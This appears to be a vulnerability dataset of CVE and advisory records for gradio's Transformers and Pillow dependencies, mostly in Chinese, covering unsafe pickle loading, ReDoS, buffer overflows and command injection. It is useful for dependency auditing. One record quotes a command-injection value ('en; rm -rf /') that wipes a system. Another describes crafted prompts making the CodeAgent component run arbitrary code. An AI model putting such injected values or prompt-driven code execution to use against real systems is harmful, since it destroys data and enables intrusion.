gradio-app_gradio,transformers,,True,CVE-2024-3568,CWE-502,,Hugging Face Transformers 是一个为 Jax、PyTorch 和 TensorFlow 打造的用于先进自然语言处理的库。TFPreTrainedModel 类的 load_repo_checkpoint() 函数存在反序列化不受信任数据的漏洞。该漏洞允许攻击者通过构造恶意的序列化有效负载，利用函数中的 pickle.load() 方法在处理来自可能不受信任源的数据时执行任意代码和命令。这种不安全反序列化的根本原因是缺少对输入数据的信任边界控制，以及对来源不明数据的直接反序列化处理。,4,1
gradio-app_gradio,transformers,,True,CVE-2025-3933,CWE-1333,2025-07-11,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.50.3及之前版本存在安全漏洞，该漏洞源于DonutProcessor类的token2json方法存在正则表达式拒绝服务，可能导致服务中断。",3,2
gradio-app_gradio,transformers,,True,CVE-2025-3263,CWE-1333,2025-07-07,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.49.0版本存在安全漏洞，该漏洞源于transformers.configuration_utils模块中get_configuration_file函数的正则表达式复杂性不足，可能导致正则表达式拒绝服务攻击。",3,2
gradio-app_gradio,transformers,,True,CVE-2025-3777,CWE-20,2025-07-07,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.49.0及之前版本存在输入验证错误漏洞，该漏洞源于image_utils.py中URL验证不足，可能导致钓鱼攻击。",3,0
gradio-app_gradio,transformers,,True,CVE-2025-3264,CWE-1333,2025-07-07,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.49.0版本存在安全漏洞，该漏洞源于dynamic_module_utils.py中get_imports函数的正则表达式复杂性不足，可能导致正则表达式拒绝服务攻击。",3,2
gradio-app_gradio,transformers,,True,CVE-2025-5197,CWE-1333,2025-08-06,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.51.3及之前版本存在安全漏洞，该漏洞源于正则表达式拒绝服务攻击。",3,2
gradio-app_gradio,transformers,,True,CVE-2025-6921,CWE-400,2025-09-23,<p>transformers是Hugging Face开源的一个用于机器学习的应用程序。 transformers 4.53.0之前版本存在资源管理错误漏洞，该漏洞源于_do_use_weight_decay方法处理用户控制的正则表达式时存在缺陷，可能导致正则表达式拒绝服务攻击。</p>,3,2
gradio-app_gradio,transformers,,True,CVE-2024-11394,CWE-502,2024-11-22,Hugging Face Transformers 是一个用于 Jax、PyTorch 和 TensorFlow 的自然语言处理框架。该框架提供构建和应用 Transformer 模型的丰富工具。在其模型文件处理过程中，由于缺乏对用户提供数据的充分验证，导致存在不安全反序列化漏洞，攻击者可以通过插入特制的未验证模型文件进行反序列化，进而在应用中执行任意代码。,4,1
gradio-app_gradio,transformers,,True,CVE-2024-12720,CWE-1333,2025-03-20,Hugging Face Transformers 是一个开源的自然语言处理库，广泛应用于构建和训练先进的模型。该库支持 Jax、PyTorch 和 TensorFlow 的集成。在 tokenization_nougat_fast.py 文件中的 post_process_single() 函数存在正则表达式的处理漏洞。此漏洞由于正则表达式在特定条件下表现出指数时间复杂性，导致出现过度回溯，从而造成 CPU 使用率过高以及应用程序潜在的停机，形成拒绝服务 (DoS) 的场景。受影响的版本是 v4.46.3。,3,2
gradio-app_gradio,transformers,,True,CVE-2024-11392,CWE-502,2024-11-22,Hugging Face Transformers 是一个开源项目，提供 Jax、PyTorch 和 TensorFlow 的自然语言处理模型库。其主要用于构建和训练深度学习模型以及处理自然语言数据。在处理配置文件时，因数据验证不当，导致可能不受信任的数据被反序列化。此漏洞的核心是缺乏对用户输入数据的充分验证，从而使得攻击者能够控制程序执行流，仅需用户访问恶意页面或打开恶意配置文件即可触发。该漏洞允许嵌入恶意代码执行，并在应用环境中获得与当前用户相同的权限。,4,1
gradio-app_gradio,transformers,,True,CVE-2024-11393,CWE-502,2024-11-22,Hugging Face Transformers 是一个用于 Jax、PyTorch 和 TensorFlow 的先进自然语言处理库，提供各种预训练模型以支持多种自然语言处理任务。漏洞存在于模型文件解析过程中，因缺乏对用户输入数据的充分验证，导致不受信任的数据被反序列化。攻击者能利用该漏洞在受影响的安装上以当前用户权限执行任意代码。此漏洞主要影响版本低于4.48.0的转换脚本，但不影响核心库功能。,4,1
gradio-app_gradio,transformers,,True,CVE-2025-1194,CWE-1333,2025-04-29,Hugging Face Transformers 是一个用于自然语言处理的开源库，提供了多种预训练模型以便于开发者快速构建机器学习应用。该漏洞存在于 GPT-NeoX-Japanese 模型的 `tokenization_gpt_neox_japanese.py` 文件中，具体是在 SubWordJapaneseTokenizer 类中。当正则表达式处理经过精心构造的输入时，会导致漏洞产生。根本原因在于某些条件下的正则表达式表现出指数复杂性，导致过度回溯。这可能导致 CPU 使用率升高，进而造成应用程序停机，有效地生成拒绝服务 (DoS) 场景。受影响的版本为 v4.48.1（最新）。,3,2
gradio-app_gradio,transformers,,True,CVE-2025-2099,CWE-1333,2025-05-19,<p>在huggingface/transformers版本v4.48.3的`transformers.testing_utils`模块中，`preprocess_string()`函数存在一个漏洞。该漏洞允许通过正则表达式拒绝服务（ReDoS）攻击进行利用。处理文档字符串中代码块所使用的正则表达式包含嵌套量词，导致在处理含有大量换行符的输入时发生指数级回溯。</p>,3,2
gradio-app_gradio,transformers,,True,CVE-2025-6638,CWE-1333,2025-09-12,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.52.4版本存在安全漏洞，该漏洞源于MarianTokenizer的remove_language_code方法存在正则表达式处理效率问题，可能导致正则表达式拒绝服务。",3,2
gradio-app_gradio,transformers,,True,,,,<p>Transformers是一个支持多种任务的开源自然语言处理库，基于PyTorch和TensorFlow构建。由于在GitHub Actions工作流的分支名称未正确清理，攻击者可以利用此漏洞实现任意代码注入。当攻击者提供特制的分支名称时，可以触发不受信任的命令执行。</p>,2,1
gradio-app_gradio,transformers,,True,,,,<p>HuggingFace Transformers 是一个用于自然语言处理和机器学习的开源库，提供各种工具和模型以简化开发。该库中的 load_tool 功能允许从 HuggingFace Hub 加载外部工具，但存在远程代码执行漏洞。攻击者可以在未启用 `Trust Remote Code` 的情况下，通过从恶意构建的库加载工具，导致执行任意 Python 代码。此漏洞的调用链为 `load_tool() -&gt; Tool.from_hub() -&gt; get_class_from_dynamic_module() -&gt; get_class_in_module() -&gt; importlib.import_module(module_path)`，其中的 importlib.import_module 函数在没有任何警告的情况下执行导入操作。</p>,3,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个由 Hugging Face 开发的开源自然语言处理模型库，旨在提供强大的模型以简化深度学习任务。该库中的 TransfoXLCorpus 组件存在一个远程代码执行漏洞，当用户按照 Hugging Face 的官方指导使用该模型时，恶意用户可以通过不安全的 torch.load 方法进行攻击。攻击的根本原因在于该方法在未正确处理受信任输入时，可能执行任意可执行代码。具体来说，攻击者可利用该漏洞使受害者在本地执行恶意代码，从而在系统中创建特定文件。</p>,4,1
gradio-app_gradio,transformers,,True,,,,"<p>Transformers 是一个开源的 Python 库，旨在简化和加速使用深度学习模型的自然语言处理任务。在 `build-eval-data.py` 代码片段中，使用用户提供的字符串动态生成 shell 命令。攻击者可以通过输入特定的字符或命令，利用此漏洞进行远程命令注入。例如，如果用户将变量 `src` 或 `tgt` 设置为 ""en; rm -rf /""，那么代码将生成执行 `rm -rf /` 的命令，从而导致系统数据丢失或损坏。由于缺乏对输入的处理和验证，恶意用户可以执行任意 shell 命令。</p>",1,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个用于自然语言处理的开源 Python 库，提供多种模型和工具以简化文本建模的过程。该库的 export 函数 TextDatasetForNextSentencePrediction() 存在一个反序列化漏洞，如果读取的文件路径为 C:/1.txt，程序将会读取当前目录中精心构造的副本。该漏洞的根本原因在于库中对输入数据的处理不当，攻击者可以借此构造恶意数据流通过反序列化执行任意命令。</p>,1,1
gradio-app_gradio,transformers,,True,CVE-2025-6051,CWE-1333,2025-09-14,<p>Hugging Face Transformers 是一个用于自然语言处理 (NLP) 的开源库，提供了许多预训练的模型和工具，广泛应用于文本分类、机器翻译、文本生成等任务。此漏洞存在于该库的 `EnglishNormalizer` 类的 `normalize_numbers()` 方法中。该方法用于对数字字符串进行归一化处理，但在处理特制的长数字序列时，由于正则表达式匹配效率低下，会导致 CPU 资源过度消耗。攻击者可以通过向应用程序发送特制的输入数据，触发该漏洞，进而导致系统性能严重下降。</p>,3,2
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个用于自然语言处理的开源 Python 库，旨在借助深度学习模型简化文本处理任务。WaitCanDeadlock 漏洞是一种与并发相关的特定问题，通常发生在多线程系统中。当一个持有锁的线程被迫无期限地等待一个无法满足的条件时，可能导致死锁场景的发生。这种漏洞的触发条件为：使用 subprocess.Popen 启动子进程并直接调用 proc.wait()，如果子进程输出内容过大时，就可能会导致死锁，因此建议使用 proc.communicate() 方法来避免这一问题。</p>,1,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个基于 Python 的开源机器学习库，专注于自然语言处理任务。该库中的 CodeAgent 组件负责生成并执行解决任务的代码。然而，由于未能对生成的代码进行检查，攻击者可以通过精心构造的提示直接执行任意代码，从而导致代码执行漏洞。攻击者无需额外的授权导入即可利用此漏洞。</p>,2,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers是一个用于自然语言处理的开源Python库，能够处理预训练模型和变换器架构。当该库使用已不再安全的函数`tempfile.mktemp()`时，存在一个不安全的临时文件漏洞。由于调用`mktemp()`和随后尝试创建文件之间可能会有其他进程创建同名文件，这使得该函数不再安全。这使攻击者可以在文件打开之前影响文件内容。</p>,3,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个开源的 Python 库，用于构建和训练深度学习模型，特别是在自然语言处理方面。当用户使用 convert_maskformer_resnet_to_pytorch.py 脚本，并通过 --checkpoint_path 参数提供一个恶意的 .pkl 文件时，该脚本使用 pickle.load 进行不安全的反序列化。这使得攻击者可以在用户的系统上执行嵌入在 pickle 文件中的任意恶意代码。</p>,2,1
gradio-app_gradio,transformers,,True,,,,<p>Hugging Face Transformers 是一个用于自然语言处理的开源库，旨在为研究人员和开发者提供强大的工具以训练和应用转化器模型。该库中的 Transformer-XL 模型在执行反序列化操作时存在安全漏洞，具体是在 convert_transfo_xl_original_tf_checkpoint_to_pytorch.py 脚本中使用了 pickle.load，从而导致恶意的 pickle 文件可以被用来执行任意代码。如果攻击者能够控制传入的文件，他们可以创建一个恶意文件“一旦加载” 就可以在受害者系统上执行代码。该漏洞可以通过提供一个精心构造的 pickle 文件（例如，包含打开计算器应用的代码）进行利用。</p>,2,1
gradio-app_gradio,transformers,,True,,,,<p>transformers 是一个开源的 Python 库，主要用于自然语言处理，具有强大的模型支持。在 utils/check_self_hosted_runner.py 文件中存在命令注入漏洞。攻击者可以通过在服务或 Web 服务器中运行该工具实现任意命令执行。该漏洞的根本原因是使用了 shell=True，在 subprocess.run 函数中直接注入用户提供的命令。利用该漏洞，攻击者可以执行任意命令，例如通过特制的命令参数获取系统敏感信息。</p>,4,1
gradio-app_gradio,transformers,,True,,,,<p>Hugging Face Transformers 是一个用于自然语言处理的开源 Python 库，旨在使机器学习模型的使用更为简单和可访问。该漏洞涉及用户在 https://huggingface.co/ 上传的个人资料图片，其 EXIF 地理位置数据未被去除。这导致任何人都可以获取用户的敏感信息，例如他们的地理位置和设备信息（如设备名称、版本、使用的软件及其版本等）。</p>,3,1
gradio-app_gradio,Pillow,,True,,,2023-10-05,"## Duplicate Advisory
This advisory has been withdrawn because it is a duplicate of GHSA-56pw-mpj4-fxww. This link is maintained to preserve external references.

## Original Description
Pillow versions before v10.0.1 bundled libwebp binaries in wheels that are vulnerable to CVE-2023-5129 (previously CVE-2023-4863). Pillow v10.0.1 upgrades the bundled libwebp binary to v1.3.2.",2,-2
gradio-app_gradio,Pillow,,True,,CWE-400,2021-04-24,"### Impact
_Pillow before 8.1.1 allows attackers to cause a denial of service (memory consumption) because the reported size of a contained image is not properly checked for a BLP container, and thus an attempted memory allocation can be very large._

### Patches
_An issue was discovered in Pillow before 6.2.0. When reading specially crafted invalid image files, the library can either allocate very large amounts of memory or take an extremely long period of time to process the image._

### Workarounds
_An issue was discovered in Pillow before 6.2.0. When reading specially crafted invalid image files, the library can either allocate very large amounts of memory or take an extremely long period of time to process the image._

### References
https://nvd.nist.gov/vuln/detail/CVE-2021-27921

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [example link to repo](http://example.com)
* Email us at [example email address](mailto:example@example.com)",2,2
gradio-app_gradio,Pillow,,True,,CWE-400,2022-03-12,"JpegImagePlugin may append an EOF marker to the end of a truncated file, so that the last segment of the data will still be processed by the decoder.

If the EOF marker is not detected as such however, this could lead to an infinite loop where JpegImagePlugin keeps trying to end the file.",4,-2
gradio-app_gradio,Pillow,,True,CVE-2022-45198,CWE-409,2022-11-14,"Pillow是一款基于Python的图像处理库。
Pillow 9.2.0之前版本存在安全漏洞，该漏洞源于对高度压缩的GIF数据处理不当。",2,2
gradio-app_gradio,Pillow,,True,CVE-2020-10994,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/Jpeg2KDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
gradio-app_gradio,Pillow,,True,CVE-2016-4009,CWE-119,2016-04-13,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 3.1.1之前版本的libImaging/Resample.c文件中的‘ImagingResampleHorizontal’函数存在整数溢出漏洞。远程攻击者可借助负的‘new’的大小值利用该漏洞造成拒绝服务（基于堆的缓冲区溢出）。",1,2
gradio-app_gradio,Pillow,,True,CVE-2020-11538,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.0.0及之前版本中的libImaging/SgiRleDecode.c文件的SGI图像文件的处理存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",1,0
gradio-app_gradio,Pillow,,True,CVE-2021-27923,CWE-20,2021-03-03,"Pillow是Pillow开源的一款基于Python的图像处理库。
Pillow 8.1.1之前版本 存在输入验证错误漏洞，该漏洞允许攻击者导致拒绝服务。",2,2
gradio-app_gradio,Pillow,,True,CVE-2021-27922,CWE-20,2021-03-03,"Pillow是Pillow开源的一款基于Python的图像处理库。
Pillow 8.1.1之前版本 存在输入验证错误漏洞，该漏洞允许攻击者导致拒绝服务。",2,2
gradio-app_gradio,Pillow,,True,CVE-2021-27921,CWE-20,2021-03-03,"Pillow是Pillow开源的一款基于Python的图像处理库。
Pillow 8.1.1之前版本 存在输入验证错误漏洞，该漏洞允许攻击者导致拒绝服务。",2,2
gradio-app_gradio,Pillow,,True,CVE-2021-25290,CWE-787,2021-03-11,<p>Pillow是一款基于Python的图像处理库。 Pillow 8.1.1之前版本存在安全漏洞。该漏洞源于在TiffDecode.c中存在一个大小无效的负偏移memcpy。</p>,2,2
gradio-app_gradio,Pillow,,True,CVE-2021-25293,CWE-125,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1版本之前存在安全漏洞。该漏洞源于SGIRleDecode.c中存在越界读取。",2,2
gradio-app_gradio,Pillow,,True,CVE-2021-25291,CWE-125,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1之前版本中存在安全漏洞。该漏洞源于TiffDecode.c在TiffreadRGBATile中通过无效的title越界读取。",2,2
gradio-app_gradio,Pillow,,True,CVE-2020-35653,CWE-125,2021-01-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.0之前版本中存在缓冲区错误漏洞，当解码一个精心制作的PCX文件时，PoxDecode有一个缓冲区过读，因为缓冲区计算信任用户提供的stride值。",2,0
gradio-app_gradio,Pillow,,True,,CWE-78,2020-11-02,"## Overview
[Pillow](https://python-pillow.org/) is a PIL (Python Imaging Library) fork.

Affected versions of this package are vulnerable to Command Injection in filenames that contain single quotes via `load_djpeg`.
## Remediation
Upgrade `Pillow` to version 2.5.0 or higher.
## References
- [GitHub PR](https://github.com/python-pillow/Pillow/pull/748)
- [Pillow Changelog](https://github.com/python-pillow/Pillow/blob/master/CHANGES.rst#250-2014-07-01)
",1,0
gradio-app_gradio,Pillow,,True,CVE-2020-10378,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/PcxDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
gradio-app_gradio,Pillow,,True,CVE-2020-10177,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/FliDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
gradio-app_gradio,Pillow,,True,CVE-2020-5312,CWE-120,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/PcxDecode.c文件存在缓冲区错误漏洞，该漏洞源于程序没有正确检查边界。远程攻击者可借助特制PCX文件利用该漏洞在系统上执行任意代码。",1,2
gradio-app_gradio,Pillow,,True,CVE-2020-5311,CWE-120,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/SgiRleDecode.c文件存在缓冲区错误漏洞，该漏洞源于程序没有正确检查边界。远程攻击者可借助特制SGI文件利用该漏洞在系统上执行任意代码，或者导致应用程序崩溃。",1,2
gradio-app_gradio,Pillow,,True,CVE-2020-5313,CWE-125,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/FliDecode.c文件存在缓冲区错误漏洞，该漏洞源于程序没有正确检查边界。远程攻击者可借助特制FLI文件利用该漏洞在系统上执行任意代码，或者导致应用程序崩溃。",2,0
gradio-app_gradio,Pillow,,True,CVE-2019-16865,CWE-770,2019-10-04,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.0之前版本中存在安全漏洞。攻击者可利用该漏洞造成拒绝服务。",2,2
gradio-app_gradio,Pillow,,True,CVE-2016-9189,CWE-190,2016-11-04,"Pillow是美国软件开发者Alex Clark所研发的一个对PIL（Python图像处理库）一些BUG修正后的编译版。

Pillow 3.3.2之前的版本中存在安全漏洞。上下文相关的攻击者可利用该漏洞获取敏感信息。",3,0
gradio-app_gradio,Pillow,,True,CVE-2016-9190,CWE-284,2016-11-04,"Pillow是美国软件开发者Alex Clark所研发的一个对PIL（Python图像处理库）一些BUG修正后的编译版。

Pillow 3.3.2之前的版本中存在安全漏洞。上下文相关的攻击者可通过使用‘crafted image file’方法利用该漏洞执行任意代码。",2,0
gradio-app_gradio,Pillow,,True,CVE-2016-0775,CWE-119,2016-04-13,"Pillow是一款基于Python的图像处理库。
Pillow 3.1.1之前版本的libImaging/FliDecode.c文件中的‘ImagingFliDecode’函数存在缓冲区错误漏洞。远程攻击者可借助特制的FLI文件利用该漏洞造成拒绝服务（崩溃）。",2,0
gradio-app_gradio,Pillow,,True,CVE-2016-2533,CWE-119,2016-04-13,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 3.1.1之前版本和PIL 1.1.7及之前版本的PcdDecode.c文件中的‘ImagingPcdDecode’函数存在缓冲区溢出漏洞。远程攻击者可借助特制的PhotoCD文件利用该漏洞造成拒绝服务（崩溃）。",2,0
gradio-app_gradio,Pillow,,True,CVE-2014-1932,CWE-59,2014-04-17,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。Pillow是对PIL的一些BUG修正后的编译版。
PIL 1.1.7及之前的版本和Pillow 2.3.0及之前的版本中的JpegImagePlugin.py文件的‘load_djpeg’函数；EpsImagePlugin.py文件的‘Ghostscript’函数；IptcImagePlugin.py文件的‘load’函数；Image.py文件的‘_copy’函数存在安全漏洞，该漏洞源于程序没有正确创建临时文件。本地攻击者可通过对临时文件的符号链接攻击利用该漏洞覆盖任意文件，获取敏感信息。",2,0
gradio-app_gradio,Pillow,,True,CVE-2014-1933,CWE-264,2014-04-17,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。Pillow是对PIL的一些BUG修正后的编译版。
PIL 1.1.7及之前的版本和Pillow 2.3.0及之前的版本中的JpegImagePlugin.py和EpsImagePlugin.py脚本存在安全漏洞，该漏洞源于程序在命令行上使用临时文件名。本地攻击者可利用该漏洞实施符号链接攻击。",3,0
gradio-app_gradio,Pillow,,True,CVE-2016-0740,CWE-119,2016-04-13,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 3.1.1之前版本的libImaging/TiffDecode.c文件中的‘ImagingLibTiffDecode’函数存在缓冲区溢出漏洞。远程攻击者可借助特制的TIFF文件利用该漏洞覆盖内存。",3,0
gradio-app_gradio,Pillow,,True,CVE-2020-10379,CWE-120,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/TiffDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
gradio-app_gradio,Pillow,,True,CVE-2022-24303,CWE-22,2022-02-03,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.1之前版本存在输入验证错误漏洞，该漏洞源于产品的remove操作未验证用户输入数据。攻击者可通过该漏洞利用输入命令来修改或删除预期的命令。",2,2
gradio-app_gradio,Pillow,,True,CVE-2022-22815,CWE-665,2022-01-07,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.0 之前存在安全漏洞，该漏洞源于 path.c 中的 path_getbbox 不正确地初始化 ImagePath.Path。",3,2
gradio-app_gradio,Pillow,,True,CVE-2022-22816,CWE-125,2022-01-07,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.0 之前存在安全漏洞，该漏洞源于 path.c 中的 path_getbbox 在 ImagePath.Path 初始化期间有一个缓冲区过度读取。",3,2
gradio-app_gradio,Pillow,,True,CVE-2022-22817,CWE-94,2022-01-07,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.0 之前存在安全漏洞，该漏洞源于 PIL.ImageMath.eval 允许评估任意表达式，例如使用 Python exec 方法的表达式。",1,2
gradio-app_gradio,Pillow,,True,,CWE-400,2022-01-04,"## Overview
[Pillow](https://python-pillow.org/) is a PIL (Python Imaging Library) fork.

Affected versions of this package are vulnerable to Denial of Service (DoS). The `JpegImagePlugin` may append an EOF marker to the end of a truncated file, so that the last segment of the data will still be processed by the decoder. If the EOF marker is not detected as such, this can lead to an infinite loop where `JpegImagePlugin` keeps trying to end the file.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `Pillow` to version 9.0.0 or higher.
## References
- [GitHub Commit](https://github.com/python-pillow/Pillow/pull/5921/commits/1059eb537639925c96d3245dcd73c106d4266c83)
- [GitHub Issue](https://github.com/python-pillow/Pillow/issues/5864#issuecomment-1003788821)
- [GitHub PR](https://github.com/python-pillow/Pillow/pull/5921)
- [Release Notes](https://pillow.readthedocs.io/en/stable/releasenotes/9.0.0.html#ensure-jpegimageplugin-stops-at-the-end-of-a-truncated-file)
",3,0
gradio-app_gradio,Pillow,,True,CVE-2021-34552,CWE-120,2021-07-13,"Pillow是一款基于Python的图像处理库。
Pillow 中存在缓冲区错误漏洞，该漏洞源于产品的convert .c未能验证参数的安全性，攻击者可通过该漏洞引发缓冲区溢出。以下产品及版本受到影响：Pillow 8.2.0 之前版本、PIL 1.1.7 之前版本。",1,2
gradio-app_gradio,Pillow,,True,CVE-2021-28677,CWE-20,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在输入验证错误漏洞，该漏洞由于在处理换行符（例如在打开文件时使用“  r”，“  n”）时对用户提供的输入的验证不足而存在的。远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,2
gradio-app_gradio,Pillow,,True,CVE-2021-28675,CWE-252,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在资源管理错误漏洞，该漏洞由于对PsdImagePlugin.PsdImageFile方法中的内部资源管理不当，远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,0
gradio-app_gradio,Pillow,,True,CVE-2021-28678,CWE-345,2021-04-13,"Pillow是一款基于Python的图像处理库。
